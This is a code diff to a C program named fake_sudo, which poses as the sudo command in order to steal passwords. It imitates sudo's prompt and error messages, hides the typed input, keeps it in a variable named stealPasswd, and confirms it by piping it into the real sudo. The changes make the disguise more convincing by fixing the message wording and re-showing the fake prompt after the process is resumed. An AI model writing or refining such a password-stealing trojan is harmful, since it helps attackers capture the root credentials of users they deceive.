@@ -39,6 +39,7 @@
 
 int successFlag = 1;
 int retryTimes = 0;
+int subshell_done = 0;
 char current_user[2048];
 struct termios recoverterminal;
 
@@ -250,14 +251,34 @@ clear_all(){
 void
 user_interrupt(int signo){
     if (retryTimes == 0){
+       printf("\n");
     } else if(retryTimes == 1){
-       printf("\nsudo: %d incorrect password attempt\n", retryTimes); 
+       printf("sudo: %d incorrect password attempt\n", retryTimes); 
     } else{
-       printf("\nsudo: %d incorrect password attempts\n", retryTimes); 
+       printf("sudo: %d incorrect password attempts\n", retryTimes); 
     }
 
     tcsetattr (fileno (stdin), TCSAFLUSH, &recoverterminal);
     exit(1);
+}
+
+void 
+user_wakeup(int signo){
+    if (subshell_done){
+        struct termios fakeTerminal, realTerminal;
+        printf("[sudo] password for %s: ", current_user);
+        fflush(stdout);
+        if (tcgetattr (fileno (stdin), &realTerminal) != 0)
+            return;
+
+        fakeTerminal = realTerminal;
+        fakeTerminal.c_lflag &= ~ECHO;
+
+        recoverterminal = realTerminal;
+
+        if (tcsetattr (fileno (stdin), TCSAFLUSH, &fakeTerminal) != 0)
+            return;
+    }
 }
 
 char * 
@@ -271,6 +292,7 @@ fake_sudo(struct passwd *usrInfo,int argc,char arguments[],char *params[])
 
     strcpy(current_user,usrInfo->pw_name);
     signal(SIGINT,user_interrupt);
+    signal(SIGCONT,user_wakeup);
 
     if (argc != 1)
     {
@@ -290,7 +312,18 @@ fake_sudo(struct passwd *usrInfo,int argc,char arguments[],char *params[])
             snprintf(testCommand, sizeof(testCommand), "echo '%s' | /usr/bin/sudo -S whoami >/dev/null 2>&1",stealPasswd);
             printf("\n");
 
+            subshell_done = 0;
+
             int testret = system(testCommand);
+
+            subshell_done = 1;
+
+            if (WIFSIGNALED(testret)) {
+                if (WTERMSIG(testret) == SIGINT){
+                    retryTimes ++;
+                    user_interrupt(SIGINT);
+                }
+            }
 
             if (testret != 0)
             {
